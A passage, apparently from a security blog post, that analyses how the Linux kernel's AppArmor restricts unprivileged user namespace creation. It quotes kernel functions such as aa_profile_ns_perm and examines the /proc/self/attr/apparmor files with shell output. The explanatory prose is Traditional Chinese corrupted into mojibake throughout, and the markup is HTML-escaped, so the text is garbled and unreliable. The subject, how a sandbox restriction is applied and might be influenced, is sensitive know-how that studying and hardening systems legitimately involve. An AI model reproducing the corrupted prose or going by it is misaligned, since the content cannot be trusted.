&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;security_hook_list&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;apparmor_hooks&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__ro_after_init&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;LSM_HOOK_INIT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;userns_create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;apparmor_userns_create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [1]&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;apparmor_userns_create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cred&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_cred&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_label&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_profile&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;label&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;begin_current_label_crit_section&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;aa_unprivileged_userns_restricted&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* default value: 1 */&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;label_mediates&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AA_CLASS_NS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fn_label_build&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GFP_KERNEL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;aa_profile_ns_perm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ad&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [2]&lt;/span&gt;
                           &lt;span class=&quot;n&quot;&gt;AA_USERNS_CREATE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;end_current_label_crit_section&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ç•¶ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aa_profile_ns_perm()&lt;/code&gt; åµæ¸¬åˆ°ç›®å‰ç¨‹å¼ä½¿ç”¨çš„è¨­å®šæª”è™•æ–¼ unconfined ç‹€æ…‹ [3] ä¸”ç‚º &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unconfined&lt;/code&gt; è¨­å®šæª” [4] æ™‚ï¼Œå®ƒæœƒç›´æ¥æŒ‡æ´¾ç¨‹å¼æˆä¸€å€‹å¯«æ­»çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unprivileged_userns&lt;/code&gt; è¨­å®šæª” [5]ã€‚é€™å€‹è¨­å®šæª”å°æ‡‰çš„å°±æ˜¯ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/apparmor.d/unprivileged_userns&lt;/code&gt;ï¼Œè€Œä¹Ÿæ­£æ˜¯å¥—ç”¨äº†è¨­å®šæª”ï¼ŒAppArmore æ‰é˜»æ­¢ç¨‹å¼å»ºç«‹éç‰¹æ¬Šä½¿ç”¨è€…å‘½åç©ºé–“ã€‚&lt;/p&gt;

&lt;p&gt;ä¸‹æ–¹æ˜¯ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aa_profile_ns_perm()&lt;/code&gt; å‡½æ•¸çš„éƒ¨åˆ†ç¨‹å¼ç¢¼ç‰‡æ®µã€‚å®Œæ•´çš„å¯¦ä½œä¸­åŒ…å«äº†å¤§é‡æ¨™è¨»äº† &lt;strong&gt;â€œTODOâ€&lt;/strong&gt; å’Œ &lt;strong&gt;â€œhardcodeâ€&lt;/strong&gt; çš„è¨»è§£ï¼Œé¡¯ç¤ºé€™æ•´å¥—æ©Ÿåˆ¶ç›®å‰ä»åœ¨é–‹ç™¼éšæ®µï¼Œè¨±å¤šè¡Œç‚ºå…¶å¯¦é‚„æ²’æœ‰æ­£å¼å®šå‹ã€‚&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_label&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;aa_profile_ns_perm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_profile&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;apparmor_audit_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ad&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;u32&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_ruleset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rules&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;list_first_entry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rules&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                            &lt;span class=&quot;n&quot;&gt;typeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rules&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_label&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_perms&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;perms&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;aa_state_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;state&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RULE_MEDIATES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rules&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ad&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile_unconfined&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [3]&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;profiles_ns&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unconfined&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [4]&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_label_parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [5]&lt;/span&gt;
                         &lt;span class=&quot;s&quot;&gt;&quot;unprivileged_userns&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GFP_KERNEL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                         &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;ad&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Userns create - transitioning profile&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;perms&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;audit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;perms&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;allow&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hard_coded&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* [...] */&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;hard_coded:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;aa_apply_modes_to_perms&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;perms&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;è¦æ€éº¼åˆ¤æ–·ç›®å‰ç¨‹å¼æ‰€ä½¿ç”¨çš„ AppArmor è¨­å®šæª”å‘¢ï¼Ÿç›´è¦ºä¸Šï¼Œé€™é¡è³‡è¨Šæ‡‰è©²æœƒè¢«è¨˜éŒ„åœ¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/proc/self/&lt;/code&gt; åº•ä¸‹çš„æŸå€‹æª”æ¡ˆä¸­ã€‚é€éåˆ†æåŸå§‹ç¢¼ï¼Œä¸¦æ­é… &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;grep&lt;/code&gt; å’Œ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;find&lt;/code&gt; ç­‰å·¥å…·æœå°‹é—œéµå­—å¾Œï¼Œæˆ‘å€‘æ‰¾åˆ°äº†ç›®æ¨™ä½ç½®ï¼š&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/proc/self/attr&lt;/code&gt;ã€‚&lt;/p&gt;

&lt;p&gt;é€™å€‹ç›®éŒ„ç”¨ä¾†å„²å­˜ç¨‹å¼çš„å±¬æ€§è¨­å®šï¼Œå…¶ä¸­æœ‰ä¸€å€‹å­ç›®éŒ„åç‚º &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apparmor&lt;/code&gt;ï¼Œå°ˆé–€å­˜æ”¾èˆ‡ AppArmor æœ‰é—œçš„è³‡è¨Šã€‚&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aaa@aaa:~/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt; /proc/self/attr
total 0
dr-xr-xr-x 2 aaa aaa 0 Feb 17 12:16 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
dr-xr-xr-x 9 aaa aaa 0 Feb 17 12:16 ..
dr-xr-xr-x 2 aaa aaa 0 Feb 17 12:16 apparmor
&lt;span class=&quot;nt&quot;&gt;-rw-rw-rw-&lt;/span&gt; 1 aaa aaa 0 Feb 17 12:16 current
&lt;span class=&quot;nt&quot;&gt;-rw-rw-rw-&lt;/span&gt; 1 aaa aaa 0 Feb 17 12:16 &lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-rw-rw-rw-&lt;/span&gt; 1 aaa aaa 0 Feb 17 12:16 fscreate
&lt;span class=&quot;nt&quot;&gt;-rw-rw-rw-&lt;/span&gt; 1 aaa aaa 0 Feb 17 12:16 keycreate
&lt;span class=&quot;nt&quot;&gt;-r--r--r--&lt;/span&gt; 1 aaa aaa 0 Feb 17 12:16 prev
dr-xr-xr-x 2 aaa aaa 0 Feb 17 12:16 smack
&lt;span class=&quot;nt&quot;&gt;-rw-rw-rw-&lt;/span&gt; 1 aaa aaa 0 Feb 17 12:16 sockcreate
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;åœ¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/proc/self/attr/apparmor&lt;/code&gt; ç›®éŒ„ä¸‹çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;current&lt;/code&gt; æª”æ¡ˆï¼Œç”¨ä¾†é¡¯ç¤ºç•¶å‰ç¨‹å¼æ‰€ä½¿ç”¨çš„ AppArmor è¨­å®šæª”ã€‚é›–ç„¶é€™å€‹æª”æ¡ˆå…·å‚™å¯«å…¥æ¬Šé™ï¼Œä½†å¯¦éš›ä¸Šè¦è®“ä¿®æ”¹ç”Ÿæ•ˆï¼Œå¿…é ˆä½¿ç”¨ç‰¹å®šæ ¼å¼å¯«å…¥å…§å®¹ï¼Œå¦å‰‡ç³»çµ±æœƒå¿½ç•¥é€™äº›æ“ä½œã€‚&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aaa@aaa:~/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /proc/self/attr/current
unconfined

aaa@aaa:~/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;AAA &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /proc/self/attr/current
&lt;span class=&quot;nt&quot;&gt;-bash&lt;/span&gt;: &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt;: write error: Invalid argument
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;é€éå°‡é€™äº›æª”æ¡ˆåç¨±å°æ‡‰å›åŸå§‹ç¢¼ï¼Œæˆ‘å€‘å¯ä»¥å¾æª”æ¡ˆæ“ä½œçš„å®šç¾©ä¸­ï¼Œæ‰¾å‡ºè™•ç†è®€å¯«è«‹æ±‚çš„å‡½å¼ï¼Œé€²è€Œäº†è§£é€™äº›æª”æ¡ˆå¯¦éš›ä¸Šæ˜¯å¦‚ä½•è¢«ä½¿ç”¨çš„ã€‚&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#define ATTR(LSMID, NAME, MODE)             \
    NOD(NAME, (S_IFREG|(MODE)),             \
        NULL, &amp;amp;proc_pid_attr_operations,    \
        { .lsmid = LSMID })
&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pid_entry&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;smack_attr_dir_stuff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ATTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LSM_ID_SMACK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;current&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;0666&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;LSM_DIR_OPS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;smack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pid_entry&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;apparmor_attr_dir_stuff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ATTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LSM_ID_APPARMOR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;current&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mo&quot;&gt;0666&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ATTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LSM_ID_APPARMOR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;prev&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;     &lt;span class=&quot;mo&quot;&gt;0444&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ATTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LSM_ID_APPARMOR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;exec&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;     &lt;span class=&quot;mo&quot;&gt;0666&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;LSM_DIR_OPS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;apparmor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pid_entry&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;attr_dir_stuff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ATTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LSM_ID_UNDEF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;current&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;     &lt;span class=&quot;mo&quot;&gt;0666&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ATTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LSM_ID_UNDEF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;prev&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;        &lt;span class=&quot;mo&quot;&gt;0444&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
